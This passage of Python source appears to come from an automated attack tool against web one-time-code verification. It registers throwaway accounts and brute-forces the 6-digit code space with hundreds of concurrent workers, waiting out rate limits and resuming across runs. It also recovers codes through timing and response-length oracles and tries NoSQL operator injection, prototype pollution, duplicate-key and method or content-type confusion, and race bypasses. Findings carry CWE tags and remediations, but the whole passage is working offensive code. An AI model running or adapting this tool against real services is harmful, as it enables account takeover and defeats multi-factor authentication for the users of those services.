                               "redirects to OTP — flow captured")
                    return


class FieldDiscovery:
    def __init__(self, sess, verify_url, findings, flow):
        self.sess = sess
        self.verify_url = verify_url
        self.findings = findings
        self.flow = flow

    def discover(self):
        if not self.verify_url:
            return []
        PANEL.section("FIELD-DISCOVERY")
        payload = {}
        if self.flow.account:
            payload["account"] = self.flow.account
        if self.flow.csrf_token and self.flow.csrf_field:
            payload[self.flow.csrf_field] = self.flow.csrf_token
        discovered = []
        for i in range(8):
            r = self.sess.post(self.verify_url, json=payload,
                               timeout=6)
            if r is None:
                break
            text = getattr(r, "text", "") or ""
            status = getattr(r, "status_code", 0)
            PANEL.data(f"iter {i}",
                       f"{status} keys={list(payload.keys())} "
                       f"body={text[:60]}")
            missing = extract_missing_fields(text)
            if not missing:
                break
            for field in missing:
                field_clean = field.strip(".'\"`")
                if field_clean and field_clean not in payload:
                    if field_clean.lower() in ("code", "otp", "token",
                                                "pin", "otpcode"):
                        payload[field_clean] = "000000"
                    elif field_clean.lower() in ("email",):
                        payload[field_clean] = self.flow.account
                    elif field_clean.lower() in ("username", "user"):
                        payload[field_clean] = self.flow.account
                    elif field_clean.lower() in ("account",):
                        payload[field_clean] = self.flow.account
                    elif field_clean.lower() in ("password",):
                        payload[field_clean] = self.flow.password
                    elif "csrf" in field_clean.lower():
                        payload[field_clean] = self.flow.csrf_token
                    else:
                        payload[field_clean] = "1"
                    discovered.append(field_clean)
                    PANEL.data("found field", field_clean)
            if not discovered:
                break
        self.flow.discovered_fields = discovered
        if discovered:
            self.flow.payload_verify = payload
            self.findings.add(
                title=f"Discovered required fields: "
                      f"{','.join(discovered)}",
                severity="info", category="flow",
                endpoint=self.verify_url,
                description="derived from server error messages",
                evidence={"fields": discovered,
                          "final_payload": payload},
                remediation="validate inputs, don't leak field names")
        PANEL.end_section()
        return discovered


class FlowFinder:
    def __init__(self, sess, base_url, findings, endpoints):
        self.sess = sess
        self.base_url = base_url
        self.findings = findings
        self.endpoints = endpoints
        self.flow = Flow()

    def run(self):
        PANEL.section("FLOW-1  find")
        self._find()
        PANEL.end_section()

        PANEL.section("FLOW-2  register")
        self._register()
        PANEL.end_section()

        PANEL.set(status="login-flow")
        login = LoginFlow(self.sess, self.base_url,
                          self.findings, self.flow)
        login.run()

        PANEL.set(status="field-discovery")
        fd = FieldDiscovery(self.sess, self.flow.verify_url,
                            self.findings, self.flow)
        fd.discover()

        PANEL.section("FLOW-3  probe payload")
        self._probe()
        PANEL.end_section()

        PANEL.section("FLOW-4  multi-baseline")
        self._baselines()
        PANEL.end_section()

        PANEL.section("FLOW-5  second account")
        self._register2()
        PANEL.end_section()

        PANEL.section("FLOW-SUMMARY")
        PANEL.data("verify", self.flow.verify_url or "?")
        PANEL.data("request", self.flow.request_url or "?")
        PANEL.data("register", self.flow.register_url or "?")
        PANEL.data("login", self.flow.login_url or "?")
        PANEL.data("reset", self.flow.reset_url or "?")
        PANEL.data("account", self.flow.account or "?")
        PANEL.data("account2", self.flow.account_2 or "?")
        PANEL.data("csrf field", self.flow.csrf_field or "none")
        PANEL.data("discovered fields",
                   ",".join(self.flow.discovered_fields) or "none")
        PANEL.data("verify payload",
                   json.dumps(self.flow.payload_verify))
        PANEL.data("verify style", self.flow.verify_style)
        PANEL.data("baseline status", str(self.flow.baseline_status))
        PANEL.data("baseline len", str(self.flow.baseline_len))
        PANEL.data("baselines collected",
                   str(len(self.flow.baselines)))
        PANEL.data("reason", self.flow.reason or "ok")
        PANEL.end_section()
        return self.flow

    def _find(self):
        verify_candidates = []
        request_candidates = []
        for path, ep in self.endpoints.items():
            if not path.startswith("/") or ep.noise:
                continue
            low = path.lower()
            if ep.status not in (200, 400, 401, 403, 405, 422, 428):
                continue
            if any(k in low for k in ("verify", "confirm",
                                       "validate", "submit", "check")):
                verify_candidates.append((path, ep))
            if any(k in low for k in ("request", "send", "issue",
                                       "resend", "generate")):
                request_candidates.append((path, ep))
            if not self.flow.register_url and any(
                    k in low for k in ("register", "signup")):
                self.flow.register_url = self.base_url + path
                PANEL.data("register candidate", path)
            if not self.flow.login_url and any(
                    k in low for k in ("login", "signin")):
                self.flow.login_url = self.base_url + path
                PANEL.data("login candidate", path)
            if not self.flow.reset_url and "reset" in low and any(
                    k in low for k in
                    ("request", "forgot", "initiate", "send")):
                self.flow.reset_url = self.base_url + path
                PANEL.data("reset candidate", path)
        if verify_candidates:
            verify_candidates.sort(
                key=lambda x: (-len(x[0]), x[0]))
            self.flow.verify_url = \
                self.base_url + verify_candidates[0][0]
            PANEL.data("verify candidate", verify_candidates[0][0])
        if request_candidates:
            request_candidates.sort(
                key=lambda x: (-len(x[0]), x[0]))
            self.flow.request_url = \
                self.base_url + request_candidates[0][0]
            PANEL.data("request candidate", request_candidates[0][0])
        if not self.flow.login_url:
            for p in LOGIN_PATHS:
                u = self.base_url + p
                r = self.sess.get(u, timeout=4)
                if r is not None and getattr(r, "status_code", 0) == 200:
                    text = getattr(r, "text", "") or ""
                    if is_auth_page(text):
                        self.flow.login_url = u
                        PANEL.data("login found", p)
                        break

    def _register(self):
        rand = random.randint(10 ** 6, 10 ** 7)
        email = f"rose{rand}@example.test"
        pwd = "R0s3!" + str(rand)
        phone = "+880170000" + str(rand)[-4:]
        urls = []
        if self.flow.register_url:
            urls.append(self.flow.register_url)
        for p in REGISTER_PATHS:
            u = self.base_url + p
            if u not in urls:
                urls.append(u)
        fields = [
            {"email": email, "password": pwd},
            {"email": email, "password": pwd, "password2": pwd},
            {"email": email, "password": pwd,
             "username": email.split("@")[0]},
            {"username": email.split("@")[0], "password": pwd},
            {"phone": phone, "password": pwd},
            {"mobile": phone, "password": pwd},
            {"phone": phone, "password": pwd,
             "name": email.split("@")[0]},
            {"name": email.split("@")[0], "email": email,
             "password": pwd},
            {"name": email.split("@")[0], "phone": phone,
             "password": pwd},
        ]
        for url in urls:
            for payload in fields:
                for style in ("json", "form"):
                    if style == "json":
                        r = self.sess.post(url, json=payload,
                                          timeout=6)
                    else:
                        r = self.sess.post(url, data=payload,
                                          timeout=6)
                    if r is None:
                        continue
                    status = getattr(r, "status_code", 0)
                    text = getattr(r, "text", "") or ""
                    PANEL.data(f"reg {urlparse(url).path}",
                               f"{status} {style} {text[:60]}")
                    if status not in (200, 201, 202):
                        continue
                    if is_auth_page(text):
                        PANEL.data(
                            "reg rejected",
                            "returned auth-page (not real signup)")
                        continue
                    if not looks_json(r):
                        continue
                    ok = False
                    try:
                        j = r.json()
                        js = json_success(j)
                        if js is True:
                            ok = True
                        elif js is None and \
                                any(k in j for k in
                                    ("id", "user_id", "account_id",
                                     "token", "access_token")):
                            ok = True
                    except Exception:
                        pass
                    if not ok:
                        continue
                    self.flow.account = email
                    self.flow.password = pwd
                    self.flow.register_url = url
                    self.findings.add(
                        title="open registration",
                        severity="info", category="flow",
                        endpoint=url,
                        description="self-registration allowed",
                        evidence={"account": email,
                                  "style": style,
                                  "response": text[:200]},
                        remediation="require captcha/phone")
                    PANEL.data("account", email)
                    return
        self.flow.account = f"u{rand}@example.test"
        self.flow.reason = "no open registration"
        PANEL.data("account", "PLACEHOLDER (registration failed)")

    def _probe(self):
        if not self.flow.verify_url:
            self.flow.reason = "no verify url"
            PANEL.emit(C.YELLOW, "SKIP", "probe: no verify url")
            return
        if self.flow.payload_verify:
            PANEL.data("probe skipped", "field discovery already set")
            return
        candidates = [
            {"account": self.flow.account, "code": "000000"},
            {"email": self.flow.account, "code": "000000"},
            {"username": self.flow.account, "code": "000000"},
            {"phone": "+8801700000000", "code": "000000"},
            {"mobile": "+8801700000000", "code": "000000"},
            {"account": self.flow.account, "otp": "000000"},
            {"email": self.flow.account, "otp": "000000"},
            {"account": self.flow.account, "token": "000000"},
            {"account": self.flow.account, "otpCode": "000000"},
            {"account": self.flow.account, "otp_code": "000000"},
            {"user": {"email": self.flow.account}, "code": "000000"},
            {"code": "000000"}, {"otp": "000000"},
            {"token": "000000"},
            {"verification_code": "000000"},
            {"pin": "000000"},
        ]
        for payload in candidates:
            for style in ("json", "form"):
                if style == "json":
                    r = self.sess.post(self.flow.verify_url,
                                       json=payload, timeout=6)
                else:
                    r = self.sess.post(self.flow.verify_url,
                                       data=payload, timeout=6)
                if r is None:
                    continue
                status = getattr(r, "status_code", 0)
                text = getattr(r, "text", "") or ""
                PANEL.data(f"probe {list(payload.keys())}",
                           f"{status} {style} {text[:60]}")
                if status in (200, 400, 401, 403, 405, 422, 428):
                    if is_cf_block(r):
                        continue
                    if status == 200 and is_auth_page(text):
                        continue
                    self.flow.payload_verify = payload
                    self.flow.verify_style = style
                    PANEL.data("verified payload",
                               json.dumps(payload))
                    return
        self.flow.reason = "no valid verify payload"

    def _baselines(self):
        if not self.flow.verify_url or not self.flow.payload_verify:
            PANEL.data("baseline", "SKIPPED: no verify")
            return
        payload = dict(self.flow.payload_verify)
        shapes = []
        shapes.append(("default", payload, self.flow.verify_style))
        if self.flow.csrf_token and self.flow.csrf_field:
            p2 = dict(payload)
            p2[self.flow.csrf_field] = self.flow.csrf_token
            shapes.append(("csrf", p2, self.flow.verify_style))
        if self.flow.session_cookies:
            shapes.append(("cookies", payload,
                           self.flow.verify_style))
        for name, p, style in shapes:
            p = dict(p)
            for k in ("code", "otp", "token", "otpCode", "otp_code",
                      "verification_code", "pin"):
                if k in p:
                    p[k] = "111111"
                    break
            kw = {"timeout": 8}
            if style == "json":
                kw["json"] = p
            else:
                kw["data"] = p
            if name == "cookies" and self.flow.session_cookies:
                kw["cookies"] = self.flow.session_cookies
            r = self.sess.post(self.flow.verify_url, **kw)
            if r is not None:
                content = getattr(r, "content", b"") or b""
                b = {
                    "status": getattr(r, "status_code", 0),
                    "len": len(content),
                    "hash": hashlib.sha256(content).hexdigest(),
                    "body": (getattr(r, "text", "") or "")[:200],
                }
                self.flow.baselines[name] = b
                PANEL.data(f"baseline {name}",
                           f"{b['status']} len={b['len']}")
        if "default" in self.flow.baselines:
            d = self.flow.baselines["default"]
            self.flow.baseline_status = d["status"]
            self.flow.baseline_len = d["len"]
            self.flow.baseline_hash = d["hash"]
            self.flow.baseline_body = d["body"]

    def _register2(self):
        if not self.flow.register_url:
            PANEL.data("account2", "SKIPPED: no register")
            return
        rand = random.randint(10 ** 7, 10 ** 8)
        email = f"rose{rand}@example.test"
        pwd = "R0s3!" + str(rand)
        for payload in [
            {"email": email, "password": pwd},
            {"email": email, "password": pwd,
             "username": email.split("@")[0]},
        ]:
            r = self.sess.post(self.flow.register_url,
                               json=payload, timeout=6)
            if r is None:
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            if status not in (200, 201, 202):
                continue
            if is_auth_page(text) or not looks_json(r):
                continue
            self.flow.account_2 = email
            PANEL.data("account2", email)
            return
        PANEL.data("account2", "FAILED")


class Brute:
    def __init__(self, flow, findings, engine,
                 workers=500, rps=0, max_req=1000000,
                 per_account_max=5000, digits=6,
                 worker_id=0, total_workers=1,
                 accounts=None, hits_file=None,
                 resume_file=None, on_hit=None):
        self.flow = flow
        self.findings = findings
        self.engine = engine
        self.workers = max(1, workers)
        self.rps = rps
        self.max_req = max_req
        self.per_account_max = per_account_max
        self.digits = digits
        self.worker_id = worker_id
        self.total_workers = max(1, total_workers)
        self.accounts = list(accounts or ([flow.account]
                                          if flow.account else []))
        self.hits_file = Path(hits_file) if hits_file else None
        self.resume_file = Path(resume_file) if resume_file else None
        self.on_hit = on_hit
        self.hits = []
        self.attempts = 0
        self.account_attempts = defaultdict(int)
        self.account_locked = set()
        self.lock = threading.Lock()
        self.stop = threading.Event()
        self.tried = set()
        self.retry_after = 0
        self._load_resume()

    def _load_resume(self):
        if not self.resume_file or not self.resume_file.exists():
            return
        try:
            for line in self.resume_file.read_text().splitlines():
                self.tried.add(line.strip())
            PANEL.data("resume loaded", str(len(self.tried)))
        except Exception:
            pass

    def _save_resume(self, code):
        if not self.resume_file:
            return
        try:
            with self.resume_file.open("a") as f:
                f.write(code + "\n")
        except Exception:
            pass

    def _write_hit(self, account, code):
        if not self.hits_file:
            return
        try:
            with self.hits_file.open("a") as f:
                f.write(json.dumps({
                    "account": account, "code": code,
                    "ts": now_utc()}) + "\n")
        except Exception:
            pass

    def _slice(self):
        total = 10 ** self.digits
        lo = (total * self.worker_id) // self.total_workers
        hi = (total * (self.worker_id + 1)) // self.total_workers
        n = hi - lo
        if self.max_req and self.max_req > 0:
            n = min(n, self.max_req)
        codes = (f"{i:0{self.digits}d}"
                 for i in range(lo, lo + n))
        materialized = [c for c in codes if c not in self.tried]
        random.shuffle(materialized)
        return materialized

    def _build_payload(self, account, code):
        base = dict(self.flow.payload_verify) or {}
        for k in ("code", "otp", "token", "otpCode", "otp_code",
                  "verification_code", "pin"):
            if k in base:
                base[k] = code
                break
        else:
            base["code"] = code
        for k in ("account", "email", "username", "phone", "mobile"):
            if k in base:
                base[k] = account
                break
        else:
            base["account"] = account
        if self.flow.csrf_field and self.flow.csrf_token:
            base[self.flow.csrf_field] = self.flow.csrf_token
        return base

    async def _refresh_code(self, account):
        if not self.flow.request_url:
            return
        try:
            payload = dict(self.flow.payload_request) or \
                {"account": account}
            for k in ("account", "email", "username", "phone",
                      "mobile"):
                if k in payload:
                    payload[k] = account
                    break
            await self.engine.request("POST",
                                      self.flow.request_url,
                                      json_body=payload)
        except Exception:
            pass

    async def _refresh_loop(self):
        while not self.stop.is_set():
            for acct in self.accounts:
                if acct in self.account_locked:
                    continue
                await self._refresh_code(acct)
            await asyncio.sleep(300)

    def _pick_baseline(self, payload):
        if self.flow.csrf_field and \
                self.flow.csrf_field in payload and \
                "csrf" in self.flow.baselines:
            return self.flow.baselines["csrf"]
        return self.flow.baselines.get("default", {})

    async def _try_one(self, account, code):
        if self.stop.is_set():
            return
        if account in self.account_locked:
            return
        if self.retry_after > 0:
            await asyncio.sleep(self.retry_after)
            self.retry_after = 0
        with self.lock:
            if self.account_attempts[account] >= self.per_account_max:
                self.account_locked.add(account)
                return
            self.account_attempts[account] += 1
        payload = self._build_payload(account, code)
        if self.flow.verify_style == "form":
            resp = await self.engine.request(
                "POST", self.flow.verify_url, data=payload)
        else:
            resp = await self.engine.request(
                "POST", self.flow.verify_url, json_body=payload)
        with self.lock:
            self.attempts += 1
            n = self.attempts
        self._save_resume(code)
        if resp is None:
            return
        if resp.status == 429:
            ra = resp.headers.get("retry-after", "")
            try:
                self.retry_after = int(ra) if ra else 30
            except Exception:
                self.retry_after = 30
            PANEL.emit(C.YELLOW, "RATE",
                       f"429 — retry after {self.retry_after}s")
            await asyncio.sleep(self.retry_after)
            self.retry_after = 0
            return
        if is_lockout(resp):
            with self.lock:
                self.account_locked.add(account)
            PANEL.emit(C.YELLOW, "LOCK",
                       f"{account} locked after "
                       f"{self.account_attempts[account]}")
            return
        base = self._pick_baseline(payload)
        if is_success(resp,
                      baseline_hash=base.get("hash"),
                      baseline_len=base.get("len")):
            with self.lock:
                self.hits.append((account, code))
            self.findings.add(
                title=f"OTP brute-force: {code}",
                severity="critical", category="bruteforce",
                endpoint=self.flow.verify_url,
                description=f"{account}: {code} accepted",
                evidence={"account": account, "code": code,
                          "attempts": n,
                          "status": resp.status,
                          "body": (resp.text or "")[:300]},
                remediation="rate-limit per-account + per-IP, "
                            "longer codes, constant-time verify",
                cwe="CWE-307")
            PANEL.emit(C.NEON, "HIT",
                       f"{account} -> {code} ({n} reqs)")
            self._write_hit(account, code)
            if self.on_hit:
                try:
                    self.on_hit(account, code)
                except Exception:
                    pass
            self.stop.set()

    async def _run(self):
        codes = self._slice()
        PANEL.emit(C.NEON, "BF",
                   f"worker {self.worker_id + 1}/{self.total_workers} "
                   f"| slice {len(codes)} codes | "
                   f"{len(self.accounts)} accounts | "
                   f"concurrency {self.workers}")
        if not codes:
            PANEL.emit(C.YELLOW, "BF", "empty slice")
            return
        refresh_task = asyncio.create_task(self._refresh_loop())
        sem = asyncio.Semaphore(self.workers)
        accounts_cycle = itertools.cycle(self.accounts) \
            if self.accounts else None

        async def bounded(code):
            async with sem:
                if self.stop.is_set():
                    return
                account = next(accounts_cycle)
                await self._try_one(account, code)

        tasks = []
        for code in codes:
            if self.stop.is_set():
                break
            tasks.append(asyncio.create_task(bounded(code)))
            if self.rps > 0:
                await asyncio.sleep(1.0 / self.rps)
            if len(tasks) >= self.workers * 4:
                await asyncio.wait(
                    tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = [t for t in tasks if not t.done()]
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        refresh_task.cancel()

    def run(self):
        if not self.flow.verify_url or not self.accounts:
            PANEL.emit(C.YELLOW, "SKIP",
                       "brute: no verify endpoint or accounts")
            return []
        try:
            asyncio.run(self._run())
        except RuntimeError as e:
            if "Event loop is closed" not in str(e):
                raise
        PANEL.emit(C.NEON, "BF",
                   f"done | {self.attempts} attempts | "
                   f"{len(self.hits)} hits | "
                   f"{len(self.account_locked)} locked")
        return self.hits


class Probes:
    def __init__(self, sess, flow, findings, base_url,
                 endpoints, tech):
        self.sess = sess
        self.flow = flow
        self.findings = findings
        self.base_url = base_url
        self.endpoints = endpoints
        self.tech = tech
        self.results = []
        self.skip_count = 0
        self.neg_count = 0
        self.pos_count = 0

    def _verify_payload(self, code, account=None):
        p = dict(self.flow.payload_verify) or {}
        for k in ("code", "otp", "token", "otpCode", "otp_code",
                  "verification_code", "pin"):
            if k in p:
                p[k] = code
                return p
        p["code"] = code
        if "account" not in p and "email" not in p:
            p["account"] = account or self.flow.account
        if self.flow.csrf_field and self.flow.csrf_token:
            p[self.flow.csrf_field] = self.flow.csrf_token
        return p

    def _send(self, code, method="POST", headers=None, raw=None,
              content_type=None):
        if not self.flow.verify_url:
            return None
        payload = self._verify_payload(code)
        if raw is not None:
            h = dict(headers or {})
            if content_type:
                h["Content-Type"] = content_type
            return self.sess.request(method, self.flow.verify_url,
                                     data=raw, headers=h, timeout=8)
        return self.sess.request(method, self.flow.verify_url,
                                 json=payload, headers=headers,
                                 timeout=8)

    def _success(self, r):
        base = self.flow.baselines.get("default", {})
        return is_success(
            r, baseline_hash=base.get("hash") or
            self.flow.baseline_hash or None,
            baseline_len=base.get("len") or
            self.flow.baseline_len or None)

    def _record(self, name, detail, ok=False):
        self.results.append({"probe": name, "detail": detail,
                             "ok": ok})
        if ok:
            self.pos_count += 1
            PANEL.emit(C.NEON, "+", f"{name}: {detail}")
        else:
            self.neg_count += 1
            PANEL.emit(C.GREY, "-", f"{name}: {detail}")

    def _skipped(self, name, reason):
        self.skip_count += 1
        self.results.append({"probe": name,
                             "detail": f"SKIP {reason}",
                             "ok": False})
        PANEL.emit(C.YELLOW, "SKIP", f"{name}: {reason}")

    def _need_verify(self, name):
        if not self.flow.verify_url:
            self._skipped(name, "no verify url")
            return False
        return True

    def _need_request(self, name):
        if not self.flow.request_url:
            self._skipped(name, "no request url")
            return False
        return True

    def _need_both(self, name):
        if not self.flow.verify_url or not self.flow.request_url:
            self._skipped(name, "no verify/request url")
            return False
        return True

    def _need_2acc(self, name):
        if not self.flow.account_2:
            self._skipped(name, "no second account")
            return False
        return True

    def run(self):
        self.timing()
        self.length()
        self.nosql()
        self.proto()
        self.hpp()
        self.method_confusion()
        self.ct_confusion()
        self.race()
        self.jwt()
        self.cross_account()
        self.cross_flow()
        self.session_fixation()
        self.backup_code()
        self.ssrf()
        self.xff()
        self.cors()
        self.host_header()
        self.cache_deception()
        self.cache_poison()
        self.open_redirect()
        self.xxe()
        self.ldap()
        self.ssti()
        self.method_fuzz()
        self.method_override()
        self.h2c_probe()
        self.jsonp_probe()
        self.auth_header_bypass()
        self.url_rewrite_bypass()
        self.csrf_mfa()
        self.mfa_downgrade()
        self.graphql_introspect()
        self.id_enum()
        self.mass_assignment()
        self.param_pollution_url()
        self.response_manip()
        self.subdomain_takeover()
        PANEL.section("PROBE-SUMMARY")
        PANEL.data("positive", str(self.pos_count))
        PANEL.data("negative", str(self.neg_count))
        PANEL.data("skipped", str(self.skip_count))
        PANEL.end_section()

    def timing(self):
        PANEL.section("PROBE  timing")
        if not self._need_verify("timing"):
            PANEL.end_section()
            return
        detected = []
        for pos in range(6):
            meds = {}
            for d in range(10):
                lats = []
                for _ in range(12):
                    code = "0" * pos + str(d) + "0" * (5 - pos)
                    t0 = time.perf_counter()
                    self._send(code)
                    lats.append((time.perf_counter() - t0) * 1000)
                if lats:
                    lats.sort()
                    trimmed = lats[:max(1, int(len(lats) * 0.8))]
                    meds[d] = statistics.median(trimmed)
            if len(set(meds.values())) <= 1:
                continue
            mm = statistics.median(meds.values())
            best = max(meds, key=meds.get)
            if mm > 0 and meds[best] / mm > 2.5:
                consistent = 0
                for trial in range(3):
                    lats = []
                    for _ in range(8):
                        code = "0" * pos + str(best) + "0" * (5 - pos)
                        t0 = time.perf_counter()
                        self._send(code)
                        lats.append((time.perf_counter() - t0) * 1000)
                    if lats and statistics.median(lats) > mm * 2.0:
                        consistent += 1
                if consistent >= 3:
                    detected.append(pos)
                    PANEL.data(f"timing pos {pos}",
                               f"best={meds[best]:.1f}ms "
                               f"med={mm:.1f}ms ratio="
                               f"{meds[best]/mm:.2f} (3/3)")
                else:
                    PANEL.data(f"timing pos {pos}",
                               f"ratio {meds[best]/mm:.2f} but "
                               f"inconsistent")
        self._record("timing", f"positions={detected}",
                     bool(detected))
        if detected:
            self.findings.add(
                title=f"Timing oracle {detected}",
                severity="high", category="timing",
                endpoint=self.flow.verify_url,
                description="prefix-match latency leak (2.5x+, "
                            "3/3 consistent)",
                evidence={"positions": detected},
                remediation="constant-time compare",
                cwe="CWE-208")
            recovered = ""
            for pos in range(6):
                meds = {}
                for d in range(10):
                    lats = []
                    for _ in range(25):
                        code = recovered + str(d) + "0" * (5 - pos)
                        t0 = time.perf_counter()
                        self._send(code)
                        lats.append((time.perf_counter() - t0) * 1000)
                    if lats:
                        lats.sort()
                        trimmed = lats[:max(1, int(len(lats) * 0.8))]
                        meds[d] = statistics.median(trimmed)
                if meds:
                    recovered += str(max(meds, key=meds.get))
            self._record("timing-recovered", recovered, True)
            r = self._send(recovered)
            if self._success(r):
                self.findings.add(
                    title=f"OTP timing {recovered}",
                    severity="critical", category="timing",
                    endpoint=self.flow.verify_url,
                    description="full otp via timing (verified)",
                    evidence={"code": recovered,
                              "verified": True},
                    remediation="constant-time",
                    cwe="CWE-208")
                PANEL.emit(C.NEON, "TIMING",
                           f"recovered {recovered} (verified)")
            else:
                self.findings.add(
                    title=f"timing candidate {recovered} (unverified)",
                    severity="low", category="timing",
                    endpoint=self.flow.verify_url,
                    description="recovered code did not verify — noise",
                    evidence={"code": recovered},
                    remediation="constant-time",
                    cwe="CWE-208")
                PANEL.emit(C.YELLOW, "TIMING",
                           f"candidate {recovered} did not verify")
        PANEL.end_section()

    def length(self):
        PANEL.section("PROBE  length")
        if not self._need_verify("length"):
            PANEL.end_section()
            return
        recovered = ""
        for pos in range(6):
            lens = {}
            for d in range(10):
                code = recovered + str(d) + "0" * (5 - pos)
                r = self._send(code)
                if r is not None:
                    lens[d] = (getattr(r, "status_code", 0),
                               len(getattr(r, "content", b"") or b""))
            if not lens or len(set(lens.values())) <= 1:
                self._record("length", "no diff")
                PANEL.end_section()
                return
            mode = Counter(lens.values()).most_common(1)[0][0]
            anom = [d for d in lens if lens[d] != mode]
            if len(anom) == 1:
                recovered += str(anom[0])
            else:
                self._record("length", "ambiguous")
                PANEL.end_section()
                return
        if len(recovered) == 6:
            self._record("length-recovered", recovered, True)
            r = self._send(recovered)
            if self._success(r):
                self.findings.add(
                    title=f"OTP length {recovered}",
                    severity="critical", category="timing",
                    endpoint=self.flow.verify_url,
                    description="via length diff (verified)",
                    evidence={"code": recovered, "verified": True},
                    remediation="uniform response",
                    cwe="CWE-208")
            else:
                self._record("length", "unverified candidate")
        PANEL.end_section()

    def nosql(self):
        PANEL.section("PROBE  nosql")
        if not self._need_verify("nosql"):
            PANEL.end_section()
            return
        base = dict(self.flow.payload_verify) or \
            {"account": self.flow.account, "code": "000000"}
        for name, payload in [
            ("$ne_null", {**base, "code": {"$ne": None}}),
            ("$ne_empty", {**base, "code": {"$ne": ""}}),
            ("$gt", {**base, "code": {"$gt": ""}}),
            ("$regex", {**base, "code": {"$regex": ".*"}}),
            ("$exists", {**base, "code": {"$exists": True}}),
            ("array", {**base, "code": ["000000", "111111"]}),
        ]:
            r = self.sess.post(self.flow.verify_url, json=payload,
                               timeout=8)
            if self._success(r):
                self._record("nosql", name, True)
                self.findings.add(
                    title=f"NoSQL {name}",
                    severity="critical", category="nosql",
                    endpoint=self.flow.verify_url,
                    description=f"{name} bypasses",
                    evidence={"payload": payload,
                              "status": getattr(r, "status_code", 0),
                              "body": (getattr(r, "text", "")
                                       or "")[:300]},
                    remediation="type-check",
                    cwe="CWE-943")
                PANEL.end_section()
                return
            self._record("nosql",
                         f"{name} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'} "
                         f"{(getattr(r, 'text', '') or '')[:60] if r else ''}")
        PANEL.end_section()

    def proto(self):
        PANEL.section("PROBE  proto")
        if not self._need_verify("proto"):
            PANEL.end_section()
            return
        base = dict(self.flow.payload_verify) or \
            {"account": self.flow.account, "code": "000000"}
        for name, payload in [
            ("__proto__", {**base, "__proto__": {"verified": True}}),
            ("constructor", {**base,
                             "constructor": {"prototype":
                                             {"verified": True}}}),
        ]:
            r = self.sess.post(self.flow.verify_url, json=payload,
                               timeout=8)
            if self._success(r):
                self._record("proto", name, True)
                self.findings.add(
                    title=f"proto {name}",
                    severity="critical", category="proto",
                    endpoint=self.flow.verify_url,
                    description=f"{name} pollution",
                    evidence={"payload": payload,
                              "status": getattr(r, "status_code", 0)},
                    remediation="reject __proto__",
                    cwe="CWE-1321")
                break
            self._record("proto", name)
        PANEL.end_section()

    def hpp(self):
        PANEL.section("PROBE  hpp")
        if not self._need_verify("hpp"):
            PANEL.end_section()
            return
        raw = json.dumps({"account": self.flow.account,
                          "code": "000000", "code": "111111"})
        r = self.sess.post(self.flow.verify_url, data=raw,
                           headers={"Content-Type": "application/json"},
                           timeout=8)
        if self._success(r):
            self._record("hpp", "accepted", True)
            self.findings.add(
                title="HPP", severity="high", category="hpp",
                endpoint=self.flow.verify_url,
                description="duplicate keys accepted",
                evidence={"raw": raw[:200],
                          "status": getattr(r, "status_code", 0)
                          if r else None},
                remediation="reject duplicates",
                cwe="CWE-88")
        else:
            self._record("hpp",
                         f"rejected -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'}")
        PANEL.end_section()

    def method_confusion(self):
        PANEL.section("PROBE  method")
        if not self._need_verify("method"):
            PANEL.end_section()
            return
        base = dict(self.flow.payload_verify) or \
            {"account": self.flow.account, "code": "000000"}
        accepted = []
        for m in ["PATCH", "PUT", "OPTIONS"]:
            r = self.sess.request(m, self.flow.verify_url,
                                  json=base, timeout=8)
            if r is None:
                self._record("method", f"{m} -> no response")
                continue
            status = getattr(r, "status_code", 0)
            text = getattr(r, "text", "") or ""
            if self._success(r):
                self._record("method", m, True)
                self.findings.add(
                    title=f"method {m}",
                    severity="high", category="method",
                    endpoint=self.flow.verify_url,
                    description=f"{m} accepted and returns success",
                    evidence={"method": m, "status": status},
                    remediation="POST only")
                break
            if status == 200 and not is_auth_page(text):
                accepted.append(m)
                self._record("method", f"{m} -> 200 (not rejected)")
            else:
                self._record("method",
                             f"{m} -> {status} {text[:60]}")
        if accepted:
            self.findings.add(
                title=f"HTTP {','.join(accepted)} not rejected",
                severity="low", category="method",
                endpoint=self.flow.verify_url,
                description="endpoint accepts method that should be "
                            "POST-only",
                evidence={"methods": accepted},
                remediation="reject unsupported methods (405)")
        PANEL.end_section()

    def ct_confusion(self):
        PANEL.section("PROBE  ct")
        if not self._need_verify("ct"):
            PANEL.end_section()
            return
        a = self.flow.account
        for name, ct, body in [
            ("text/plain", "text/plain",
             json.dumps({"account": a, "code": "000000"})),
            ("form", "application/x-www-form-urlencoded",
             f"account={a}&code=000000"),
            ("xml", "application/xml",
             f"<r><account>{a}</account><code>000000</code></r>"),
        ]:
            r = self.sess.post(self.flow.verify_url, data=body,
                               headers={"Content-Type": ct},
                               timeout=8)
            if self._success(r):
                self._record("ct", name, True)
                self.findings.add(
                    title=f"CT bypass {name}",
                    severity="medium", category="ct",
                    endpoint=self.flow.verify_url,
                    description=f"{ct} accepted",
                    evidence={"ct": ct,
                              "status": getattr(r, "status_code", 0)},
                    remediation="enforce json")
                break
            self._record("ct",
                         f"{name} -> "
                         f"{getattr(r, 'status_code', 0) if r else '?'}")
        PANEL.end_section()

    def race(self):
        PANEL.section("PROBE  race")
        if not self._need_verify("race"):
            PANEL.end_section()
            return

        async def fire():
            payload = self._verify_payload("000000")
            engine = AsyncEngine(concurrency=20)
            await engine.start()
            try:
                tasks = [engine.request(
                    "POST", self.flow.verify_url, json_body=payload)
                    for _ in range(10)]
                return await asyncio.gather(*tasks,
                                            return_exceptions=True)
            finally:
                await engine.close()

        try:
            results = asyncio.run(fire())
        except RuntimeError as e:
            if "Event loop is closed" not in str(e):
                raise
            results = []
        ok = sum(1 for r in results
                 if isinstance(r, AsyncResp) and r.status == 200)
        self._record("race", f"{ok}/10 success", ok > 1)
        if ok > 1:
            self.findings.add(
                title=f"race {ok}/10",
                severity="critical", category="race",
                endpoint=self.flow.verify_url,
                description="concurrent accepted",
                evidence={"ok": ok},
                remediation="atomic consume",
                cwe="CWE-362")
        PANEL.end_section()

    def jwt(self):
        PANEL.section("PROBE  jwt")
        if not self._need_verify("jwt"):
            PANEL.end_section()
            return
        if not _HAVE_JWT:
            self._skipped("jwt", "no pyjwt installed")
            PANEL.end_section()
            return
        tokens = []
        r = self.sess.get(self.flow.verify_url, timeout=8)
        if r is not None:
